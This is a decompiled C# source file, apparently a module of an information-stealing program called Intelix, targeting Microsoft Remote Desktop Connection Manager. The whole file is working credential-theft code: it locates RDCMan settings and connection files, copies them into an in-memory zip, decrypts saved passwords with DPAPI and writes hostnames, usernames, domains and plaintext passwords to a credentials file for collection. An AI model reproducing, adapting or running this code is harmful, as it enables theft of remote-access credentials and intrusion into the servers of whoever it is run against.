using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Xml;
using Intelix.Helper.Data;
using Intelix.Helper.Encrypted;

namespace Intelix.Targets.Applications
{
	// Token: 0x0200004F RID: 79
	public class RDCMan : ITarget
	{
		// Token: 0x06000100 RID: 256 RVA: 0x0000EA70 File Offset: 0x0000CC70
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Remote Desktop Connection Manager", "RDCMan.settings");
			bool flag = !File.Exists(path);
			if (!flag)
			{
				List<string> list = new List<string>();
				XmlDocument xmlDocument = new XmlDocument();
				xmlDocument.LoadXml(File.ReadAllText(path));
				XmlNodeList xmlNodeList = xmlDocument.SelectNodes("//FilesToOpen");
				bool flag2 = xmlNodeList != null;
				if (flag2)
				{
					foreach (object obj in xmlNodeList)
					{
						XmlNode xmlNode = (XmlNode)obj;
						string innerText = xmlNode.InnerText;
						bool flag3 = !string.IsNullOrEmpty(innerText) && !list.Contains(innerText);
						if (flag3)
						{
							list.Add(innerText);
						}
					}
				}
				bool flag4 = !list.Any<string>();
				if (!flag4)
				{
					Counter.CounterApplications counterApplications = new Counter.CounterApplications();
					counterApplications.Name = "RDCMan";
					StringBuilder stringBuilder = new StringBuilder();
					foreach (string text in list)
					{
						bool flag5 = !File.Exists(text);
						if (!flag5)
						{
							string text2 = "RDCMan\\" + Path.GetFileName(text);
							zip.AddFile(text2, File.ReadAllBytes(text));
							counterApplications.Files.Add(text + " => " + text2);
							XmlDocument xmlDocument2 = new XmlDocument();
							xmlDocument2.LoadXml(File.ReadAllText(text));
							XmlNodeList xmlNodeList2 = xmlDocument2.SelectNodes("//server");
							bool flag6 = xmlNodeList2 == null || xmlNodeList2.Count == 0;
							if (!flag6)
							{
								stringBuilder.AppendLine("SourceFile: " + text);
								stringBuilder.AppendLine(string.Format("Found servers: {0}", xmlNodeList2.Count));
								stringBuilder.AppendLine();
								foreach (object obj2 in xmlNodeList2)
								{
									XmlNode xmlNode2 = (XmlNode)obj2;
									string str = string.Empty;
									string str2 = string.Empty;
									string text3 = string.Empty;
									string text4 = string.Empty;
									string text5 = string.Empty;
									foreach (object obj3 in xmlNode2)
									{
										XmlNode xmlNode3 = (XmlNode)obj3;
										foreach (object obj4 in xmlNode3)
										{
											XmlNode xmlNode4 = (XmlNode)obj4;
											string name = xmlNode4.Name;
											string a = name;
											if (!(a == "name"))
											{
												if (!(a == "profileName"))
												{
													if (!(a == "userName"))
													{
														if (!(a == "password"))
														{
															if (a == "domain")
															{
																text5 = xmlNode4.InnerText;
															}
														}
														else
														{
															text4 = xmlNode4.InnerText;
														}
													}
													else
													{
														text3 = xmlNode4.InnerText;
													}
												}
												else
												{
													str2 = xmlNode4.InnerText;
												}
											}
											else
											{
												str = xmlNode4.InnerText;
											}
										}
									}
									bool flag7 = !string.IsNullOrEmpty(text4);
									if (flag7)
									{
										string str3 = this.DecryptPassword(text4);
										stringBuilder.AppendLine("----");
										stringBuilder.AppendLine("HostName: " + str);
										stringBuilder.AppendLine("ProfileName: " + str2);
										stringBuilder.AppendLine("UserName: " + (string.IsNullOrEmpty(text5) ? text3 : (text5 + "\\" + text3)));
										stringBuilder.AppendLine("DecryptedPassword: " + str3);
										stringBuilder.AppendLine();
									}
								}
								string text6 = "RDCMan\\" + Path.GetFileName(text) + "\\credentials.txt";
								zip.AddTextFile(text6, stringBuilder.ToString());
								counterApplications.Files.Add(text6 ?? "");
							}
						}
					}
					bool flag8 = counterApplications.Files.Count > 0;
					if (flag8)
					{
						counterApplications.Files.Add("RDCMan\\");
						counter.Applications.Add(counterApplications);
					}
				}
			}
		}

		// Token: 0x06000101 RID: 257 RVA: 0x0000EF8C File Offset: 0x0000D18C
		private string DecryptPassword(string password)
		{
			byte[] array = DpApi.Decrypt(Convert.FromBase64String(password));
			bool flag = array == null;
			string result;
			if (flag)
			{
				result = string.Empty;
			}
			else
			{
				result = Encoding.UTF8.GetString(array).TrimEnd(new char[1]);
			}
			return result;
		}
	}
}
